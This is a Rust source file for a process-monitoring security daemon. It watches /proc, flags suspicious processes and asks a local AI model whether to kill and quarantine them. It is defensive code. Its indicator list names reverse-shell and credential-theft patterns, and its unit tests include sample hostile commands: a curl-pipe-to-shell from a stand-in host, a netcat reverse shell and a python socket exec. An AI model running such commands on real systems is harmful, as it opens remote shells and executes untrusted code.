use std::collections::HashSet;
use std::fs;
use std::io;
use std::path::Path;
use std::process::Command;
use std::sync::{Arc, Mutex, OnceLock};
use std::thread;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use jeTT::engine::{load_model, guard as engine_guard, Engine};

// ─────────────────────────────────────────────
// jeTT Daemon — Real System Event Monitor
// Watches /proc, auditd, and system logs
// Feeds events to jeTT AI engine for verdicts
// ─────────────────────────────────────────────

const LOG_DIR: &str = "/var/log/jett";
const QUARANTINE_DIR: &str = "/var/jett/quarantine";
const VERSION: &str = "1.0.0";
const DEFAULT_BRAND_MODEL: &str = "IBM Granite 3.3 2B";
const DEFAULT_BRAND_HARDWARE: &str = "RTX 3060";
const BANNER_CONTENT_WIDTH: usize = 39;
const LOG_WRITE_LIMIT_PER_SECOND: u32 = 100;

// Trusted paths — instant ALLOW, no AI needed
const TRUSTED_PATHS: &[&str] = &[
    "/home/cosmic/Projects/",
    "/home/cosmic/Scripts/",
    "/usr/bin/",
    "/usr/lib/",
    "/usr/share/",
    "/etc/systemd/",
    "/opt/jett/",
];

// Trusted process names — instant ALLOW
const TRUSTED_PROCS: &[&str] = &[
    "bifrost",
    "ollama",
    "docker",
    "cowrie",
    "prometheus",
    "grafana",
    "loki",
    "promtail",
    "portainer",
    "mosquitto",
    "cosmic-comp",
    "cargo",
    "rclone",
    "meshtastic",
    "gni_server",
    "systemd",
    "sshd",
    "python3",
    "node",
    "pacman",
    "yay",
    "jett",
    "wireguard",
    "wg",
    "bash",
    "zsh",
    "tmux",
    "screen",
];

// Suspicious indicators — immediate flag for AI analysis
const SUSPICIOUS_LITERALS: &[&str] = &[
    "/tmp/.",
    "/tmp/",
    "/dev/shm/",
    "/var/tmp/",
    "/.cache/",
    "/Downloads/",
    "memfd_create",
    "/proc/self/mem",
    "ld_preload",
    "LD_PRELOAD",
    "/etc/shadow",
    "/etc/passwd",
    "chmod +x /tmp",
    "chmod +x /dev/shm",
    "nc -e",
    "ncat -e",
    "bash -i",
    "/bin/sh -i",
    "insmod /tmp",
    "curl",
    "wget",
    "base64 -d",
    "/.ssh/authorized_keys",
];

#[derive(Debug, Clone)]
struct ProcessEvent {
    pid: u32,
    name: String,
    cmdline: String,
    exe_path: String,
    uid: u32,
    timestamp: u64,
}

#[derive(Debug)]
struct JettVerdict {
    event: ProcessEvent,
    verdict: String,
    reason: String,
    elapsed_ms: u64,
}

#[derive(Debug)]
enum ProcReadError {
    Read {
        pid: u32,
        field: &'static str,
        source: io::Error,
    },
    MissingField {
        pid: u32,
        field: &'static str,
    },
    InvalidUid {
        pid: u32,
        raw: String,
    },
}

impl std::fmt::Display for ProcReadError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ProcReadError::Read { pid, field, source } => {
                write!(f, "failed to read /proc/{pid}/{field}: {source}")
            }
            ProcReadError::MissingField { pid, field } => {
                write!(f, "missing required /proc field {field} for PID {pid}")
            }
            ProcReadError::InvalidUid { pid, raw } => {
                write!(f, "invalid UID '{raw}' for PID {pid}")
            }
        }
    }
}

#[derive(Debug, PartialEq, Eq)]
enum ProcessDisposition {
    Suspicious,
    Trusted,
    Unknown,
}

#[derive(Debug)]
struct LogRateLimiter {
    window_start: Instant,
    writes_in_window: u32,
    dropped_in_window: u32,
}

impl LogRateLimiter {
    fn new() -> Self {
        Self {
            window_start: Instant::now(),
            writes_in_window: 0,
            dropped_in_window: 0,
        }
    }

    fn claim_slot(&mut self) -> Option<u32> {
        if self.window_start.elapsed() >= Duration::from_secs(1) {
            let dropped = self.dropped_in_window;
            self.window_start = Instant::now();
            self.writes_in_window = 1;
            self.dropped_in_window = 0;
            return Some(dropped);
        }

        if self.writes_in_window < LOG_WRITE_LIMIT_PER_SECOND {
            self.writes_in_window += 1;
            Some(0)
        } else {
            self.dropped_in_window += 1;
            None
        }
    }
}

static LOG_RATE_LIMITER: OnceLock<Mutex<LogRateLimiter>> = OnceLock::new();

fn get_timestamp() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
}

fn get_env_or_default(key: &str, default: &str) -> String {
    std::env::var(key)
        .ok()
        .filter(|value| !value.trim().is_empty())
        .unwrap_or_else(|| default.to_string())
}

fn print_banner_line(content: &str) {
    let mut rendered = content.to_string();
    if rendered.chars().count() > BANNER_CONTENT_WIDTH {
        rendered = rendered.chars().take(BANNER_CONTENT_WIDTH).collect();
    }
    println!("║ {:<39} ║", rendered);
}

fn read_proc_info(pid: u32) -> Result<ProcessEvent, ProcReadError> {
    let proc_path = format!("/proc/{}", pid);

    let name = fs::read_to_string(format!("{}/comm", proc_path))
        .map_err(|source| ProcReadError::Read {
            pid,
            field: "comm",
            source,
        })?
        .trim()
        .to_string();

    if name.is_empty() {
        return Err(ProcReadError::MissingField { pid, field: "comm" });
    }

    let cmdline = fs::read(format!("{}/cmdline", proc_path))
        .map_err(|source| ProcReadError::Read {
            pid,
            field: "cmdline",
            source,
        })?
        .iter()
        .map(|&b| if b == 0 { b' ' } else { b })
        .collect::<Vec<u8>>();
    let cmdline = String::from_utf8_lossy(&cmdline).trim().to_string();

    let exe_path = fs::read_link(format!("{}/exe", proc_path))
        .map_err(|source| ProcReadError::Read {
            pid,
            field: "exe",
            source,
        })?
        .to_string_lossy()
        .to_string();

    let status = fs::read_to_string(format!("{}/status", proc_path)).map_err(|source| {
        ProcReadError::Read {
            pid,
            field: "status",
            source,
        }
    })?;
    let uid_raw = status
        .lines()
        .find(|line| line.starts_with("Uid:"))
        .ok_or(ProcReadError::MissingField {
            pid,
            field: "status:Uid",
        })?
        .split_whitespace()
        .nth(1)
        .ok_or(ProcReadError::MissingField {
            pid,
            field: "status:Uid",
        })?
        .to_string();
    let uid = uid_raw
        .parse()
        .map_err(|_| ProcReadError::InvalidUid { pid, raw: uid_raw })?;

    Ok(ProcessEvent {
        pid,
        name,
        cmdline,
        exe_path,
        uid,
        timestamp: get_timestamp(),
    })
}

fn classify_event(event: &ProcessEvent) -> ProcessDisposition {
    if is_suspicious(event) {
        ProcessDisposition::Suspicious
    } else if is_trusted(event) {
        ProcessDisposition::Trusted
    } else {
        ProcessDisposition::Unknown
    }
}

fn is_trusted(event: &ProcessEvent) -> bool {
    for trusted in TRUSTED_PROCS {
        if event.name.contains(trusted) || event.cmdline.contains(trusted) {
            return true;
        }
    }

    for path in TRUSTED_PATHS {
        if event.exe_path.starts_with(path) || event.cmdline.contains(path) {
            return true;
        }
    }

    false
}

fn contains_pipe_to_shell(command: &str, downloader: &str) -> bool {
    command.contains(downloader)
        && command.contains('|')
        && ["| sh", "|sh", "| /bin/sh", "| bash", "|bash", "| /bin/bash"]
            .iter()
            .any(|pattern| command.contains(pattern))
}

fn is_suspicious(event: &ProcessEvent) -> bool {
    let combined = format!("{} {} {}", event.name, event.cmdline, event.exe_path).to_lowercase();

    for indicator in SUSPICIOUS_LITERALS {
        if combined.contains(indicator) {
            return true;
        }
    }

    if contains_pipe_to_shell(&combined, "curl") || contains_pipe_to_shell(&combined, "wget") {
        return true;
    }

    if (combined.contains("netcat") && combined.contains("-e"))
        || (combined.contains("python") && combined.contains("socket") && combined.contains("exec"))
        || (combined.contains("base64") && combined.contains("decode") && combined.contains("exec"))
    {
        return true;
    }

    if event.exe_path.starts_with("/tmp") || event.exe_path.starts_with("/dev/shm") {
        return true;
    }

    if event.exe_path.contains("/.") {
        return true;
    }

    false
}

fn format_event_for_ai(event: &ProcessEvent) -> String {
    format!(
        "{} PID:{} uid:{} exe:{} cmd:{} time:{}",
        event.name,
        event.pid,
        event.uid,
        event.exe_path,
        &event.cmdline.chars().take(100).collect::<String>(),
        event.timestamp
    )
}

fn validate_guard_output(
    status_success: bool,
    stdout: &[u8],
    stderr: &[u8],
) -> Result<String, String> {
    let stdout_text = String::from_utf8_lossy(stdout).trim().to_string();
    let stderr_text = String::from_utf8_lossy(stderr).trim().to_string();

    if !stderr_text.is_empty() {
        eprintln!("[!] jett --guard stderr: {}", stderr_text);
    }

    if !status_success {
        return Err(if stderr_text.is_empty() {
            "jett --guard exited unsuccessfully without stderr".to_string()
        } else {
            format!("jett --guard failed: {}", stderr_text)
        });
    }

    if stdout_text.is_empty() {
        return Err(if stderr_text.is_empty() {
            "jett --guard returned empty stdout".to_string()
        } else {
            format!("jett --guard returned empty stdout: {}", stderr_text)
        });
    }

    Ok(stdout_text)
}

fn run_guard_subprocess(event_str: &str) -> Result<String, String> {
    let output = Command::new(get_env_or_default("JETT_BIN", "jett"))
        .arg("--guard")
        .arg(event_str)
        .output()
        .map_err(|error| format!("failed to run jett --guard: {}", error))?;

    validate_guard_output(output.status.success(), &output.stdout, &output.stderr)
}

fn claim_log_slot() -> Option<u32> {
    let limiter = LOG_RATE_LIMITER.get_or_init(|| Mutex::new(LogRateLimiter::new()));
    limiter
        .lock()
        .unwrap_or_else(|error| error.into_inner())
        .claim_slot()
}

fn append_log_line(path: &str, line: &str) {
    if let Ok(mut file) = fs::OpenOptions::new().create(true).append(true).open(path) {
        use std::io::Write;
        if let Err(error) = file.write_all(line.as_bytes()) {
            eprintln!("[!] Failed writing {}: {}", path, error);
        }
    } else {
        eprintln!("[!] Failed opening log file {}", path);
    }
}

fn quarantine_process(event: &ProcessEvent) {
    let pid = event.pid.to_string();
    match Command::new("kill").args(["-9", &pid]).status() {
        Ok(status) if status.success() => {
            println!("[*] Killed quarantined PID {}", event.pid);
        }
        Ok(status) => {
            eprintln!(
                "[!] kill -9 {} exited with status {:?}",
                event.pid,
                status.code()
            );
        }
        Err(error) => {
            eprintln!("[!] Failed to kill PID {}: {}", event.pid, error);
        }
    }

    if let Err(error) = fs::create_dir_all(QUARANTINE_DIR) {
        eprintln!(
            "[!] Could not create quarantine directory {}: {}",
            QUARANTINE_DIR, error
        );
        return;
    }

    let source = Path::new(&event.exe_path);
    let Some(file_name) = source.file_name().and_then(|value| value.to_str()) else {
        eprintln!(
            "[!] Could not determine quarantine filename for PID {} at {}",
            event.pid, event.exe_path
        );
        return;
    };
    let destination = Path::new(QUARANTINE_DIR).join(format!("{}-{}", event.pid, file_name));

    match fs::copy(source, &destination) {
        Ok(_) => {
            if let Err(error) = fs::remove_file(source) {
                eprintln!(
                    "[!] Failed to remove quarantined executable {} after copying to {}: {}",
                    event.exe_path,
                    destination.display(),
                    error
                );
            }
        }
        Err(error) => {
            eprintln!(
                "[!] Failed to copy {} to {}: {}",
                event.exe_path,
                destination.display(),
                error
            );
        }
    }
}

fn log_verdict(verdict: &JettVerdict) {
    let Some(dropped_logs) = claim_log_slot() else {
        return;
    };

    if dropped_logs > 0 {
        let dropped_line = format!(
            "[{}] jeTT log rate limiter dropped {} entries in the previous second\n",
            get_timestamp(),
            dropped_logs
        );
        println!("{}", dropped_line.trim());
        append_log_line(&format!("{}/jett.log", LOG_DIR), &dropped_line);
    }

    let log_line = format!(
        "[{}] {} PID:{} → {} ({}) {}ms\n",
        verdict.event.timestamp,
        verdict.event.name,
        verdict.event.pid,
        verdict.verdict,
        verdict.reason.chars().take(80).collect::<String>(),
        verdict.elapsed_ms,
    );

    println!("{}", log_line.trim());
    append_log_line(&format!("{}/jett.log", LOG_DIR), &log_line);

    if verdict.verdict.contains("QUARANTINE") {
        let entry = format!(
            "[{}] PID:{} NAME:{} EXE:{} CMD:{} REASON:{}\n",
            verdict.event.timestamp,
            verdict.event.pid,
            verdict.event.name,
            verdict.event.exe_path,
            verdict.event.cmdline.chars().take(200).collect::<String>(),
            verdict.reason.chars().take(200).collect::<String>(),
        );
        append_log_line(&format!("{}/quarantine.log", QUARANTINE_DIR), &entry);

        let _ = Command::new("notify-send")
            .args(&[
                "--urgency=critical",
                "--icon=security-high",
                "🚨 jeTT QUARANTINE",
                &format!(
                    "PID:{} {} - {}",
                    verdict.event.pid,
                    verdict.event.name,
                    verdict.reason.chars().take(60).collect::<String>()
                ),
            ])
            .spawn();
    }
}

fn scan_new_processes(seen_pids: &Arc<Mutex<HashSet<u32>>>) -> Vec<ProcessEvent> {
    let mut new_events = Vec::new();

    let Ok(entries) = fs::read_dir("/proc") else {
        return new_events;
    };

    for entry in entries.flatten() {
        let Ok(pid) = entry.file_name().to_string_lossy().parse::<u32>() else {
            continue;
        };

        let mut seen = seen_pids.lock().unwrap_or_else(|error| error.into_inner());
        if seen.contains(&pid) {
            continue;
        }
        seen.insert(pid);
        drop(seen);

        match read_proc_info(pid) {
            Ok(event) => new_events.push(event),
            // Silently skip processes we can't read — short-lived (NotFound)
            // or root-owned (PermissionDenied). Neither is actionable noise.
            Err(ProcReadError::Read { source, .. })
                if source.kind() == io::ErrorKind::NotFound
                    || source.kind() == io::ErrorKind::PermissionDenied =>
            {
            }
            Err(error) => eprintln!("[!] {}", error),
        }
    }

    new_events
}

fn cleanup_dead_pids(seen_pids: &Arc<Mutex<HashSet<u32>>>) {
    let mut seen = seen_pids.lock().unwrap_or_else(|error| error.into_inner());
    seen.retain(|&pid| Path::new(&format!("/proc/{}", pid)).exists());
}

fn main() {
    println!("╔═══════════════════════════════════════════╗");
    print_banner_line(&format!("jeTT Daemon v{}", VERSION));
    print_banner_line("GowskiNet AI Security Monitor");
    print_banner_line(&format!(
        "{} — {}",
        get_env_or_default("JETT_BRAND_MODEL", DEFAULT_BRAND_MODEL),
        get_env_or_default("JETT_BRAND_HARDWARE", DEFAULT_BRAND_HARDWARE),
    ));
    println!("╚═══════════════════════════════════════════╝");
    println!();

    for dir in &[LOG_DIR, QUARANTINE_DIR] {
        if let Err(e) = fs::create_dir_all(dir) {
            eprintln!(
                "[!] Could not create {}: {} (try: sudo mkdir -p {})",
                dir, e, dir
            );
        }
    }

    println!("[*] Loading jeTT AI model...");
    let model_path =
        std::env::var("JETT_MODEL").unwrap_or_else(|_| "/opt/jett/models/jeTT-q4.gguf".to_string());
    println!("[*] Model: {}", model_path);

    if !Path::new(&model_path).exists() {
        eprintln!("[!] Model not found: {}", model_path);
        std::process::exit(1);
    }
    let engine: Engine = match load_model(&model_path) {
        Ok(e) => {
            println!("[OK] Model loaded into VRAM - warm and ready (no per-event reload)");
            e
        }
        Err(err) => {
            eprintln!("[!] Failed to load model: {}", err);
            std::process::exit(1);
        }
    };

    // Safety mode: "learn" (default) logs would-kills WITHOUT killing.
    // "enforce" actually kills. Default is learn — you opt INTO enforcement.
    let enforce_mode = std::env::var("JETT_MODE")
        .map(|m| m.eq_ignore_ascii_case("enforce"))
        .unwrap_or(false);
    if enforce_mode {
        println!("[\u{26a0}] ENFORCE MODE — jeTT WILL kill quarantined processes");
    } else {
        println!("[\u{1f6e1}] LEARN MODE — jeTT logs would-kills but does NOT kill (set JETT_MODE=enforce to enable killing)");
    }
    println!("[✅] jeTT daemon started — watching /proc for new processes");
    println!("[*] Logs: {}", LOG_DIR);
    println!("[*] Quarantine: {}", QUARANTINE_DIR);
    println!("[*] Press Ctrl+C to stop\n");

    let seen_pids: Arc<Mutex<HashSet<u32>>> = Arc::new(Mutex::new(HashSet::new()));

    println!("[*] Initial process scan...");
    let initial_events = scan_new_processes(&seen_pids);
    println!(
        "[*] Found {} existing processes — these will be skipped",
        initial_events.len()
    );
    println!("[*] Now monitoring for NEW processes...\n");

    let mut loop_count = 0u64;

    loop {
        let new_events = scan_new_processes(&seen_pids);

        for event in new_events {
            if event.exe_path.is_empty() || event.exe_path.contains("(deleted)") {
                continue;
            }

            let t = Instant::now();

            match classify_event(&event) {
                ProcessDisposition::Trusted => {
                    let verdict = JettVerdict {
                        verdict: "✅ ALLOW".to_string(),
                        reason: "Trusted GowskiNet process".to_string(),
                        elapsed_ms: t.elapsed().as_millis() as u64,
                        event,
                    };
                    if verdict.event.uid == 1000 {
                        log_verdict(&verdict);
                    }
                }
                ProcessDisposition::Suspicious => {
                    let event_str = format_event_for_ai(&event);
                    println!("🚨 [SUSPICIOUS DETECTED] {} — sending to AI...", event.name);

                    // Warm-model verdict: call the in-process model directly.
                    // No subprocess, no 600ms reload — model stays in VRAM.
                    let reason = match engine_guard(&engine.model, &engine.backend, &event_str) {
                        Ok(output) => output,
                        Err(error) => {
                            eprintln!("[!] guard inference failed: {}", error);
                            format!("ERROR: {}", error)
                        }
                    };

                    // GATE: only kill if the AI model actually returned QUARANTINE.
                    // The trained model is the trigger — not the path heuristic.
                    let model_says_quarantine = reason.to_uppercase().contains("QUARANTINE");
                    let verdict_label = if model_says_quarantine {
                        if enforce_mode {
                            println!("🚨 [AI VERDICT: QUARANTINE] killing PID {} ({})", event.pid, event.name);
                            quarantine_process(&event);
                            "🚨 QUARANTINE".to_string()
                        } else {
                            println!("🟡 [LEARN MODE] WOULD quarantine PID {} ({}) — not killing", event.pid, event.name);
                            "🟡 WOULD-QUARANTINE".to_string()
                        }
                    } else {
                        println!("✅ [AI VERDICT: ALLOW] {} cleared by model", event.name);
                        "✅ ALLOW".to_string()
                    };

                    let verdict = JettVerdict {
                        verdict: verdict_label,
                        reason,
                        elapsed_ms: t.elapsed().as_millis() as u64,
                        event,
                    };
                    log_verdict(&verdict);
                }
                ProcessDisposition::Unknown => {
                    let verdict = JettVerdict {
                        verdict: "⚠️  REVIEW".to_string(),
                        reason: format!("Unknown process: {}", event.exe_path),
                        elapsed_ms: t.elapsed().as_millis() as u64,
                        event,
                    };
                    log_verdict(&verdict);
                }
            }
        }

        loop_count += 1;
        if loop_count % 60 == 0 {
            cleanup_dead_pids(&seen_pids);
        }

        thread::sleep(Duration::from_millis(100));
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn event(name: &str, cmdline: &str, exe_path: &str) -> ProcessEvent {
        ProcessEvent {
            pid: 42,
            name: name.to_string(),
            cmdline: cmdline.to_string(),
            exe_path: exe_path.to_string(),
            uid: 1000,
            timestamp: 1,
        }
    }

    #[test]
    fn suspicious_execution_beats_trusted_interpreter_name() {
        let event = event("python3", "python3 /tmp/dropper.py", "/tmp/dropper.py");

        assert_eq!(classify_event(&event), ProcessDisposition::Suspicious);
    }

    #[test]
    fn broad_home_directory_is_not_trusted() {
        let event = event("unknown", "/home/alice/tmp-tool", "/home/alice/tmp-tool");

        assert!(!is_trusted(&event));
    }

    #[test]
    fn compound_suspicious_patterns_match_real_commands() {
        assert!(is_suspicious(&event(
            "bash",
            "curl -fsSL https://bad.example/payload | sh",
            "/usr/bin/bash",
        )));
        assert!(is_suspicious(&event(
            "python3",
            "python3 -c 'import socket;exec(payload)'",
            "/usr/bin/python3",
        )));
        assert!(is_suspicious(&event(
            "netcat",
            "netcat -e /bin/sh 10.0.0.5 4444",
            "/usr/bin/netcat",
        )));
    }

    #[test]
    fn guard_output_rejects_empty_stdout_and_failed_status() {
        assert!(validate_guard_output(true, b"", b"").is_err());
        assert!(validate_guard_output(false, b"ALLOW", b"bad").is_err());
        assert_eq!(
            validate_guard_output(true, b"ALLOW\n", b"").unwrap(),
            "ALLOW"
        );
    }
}
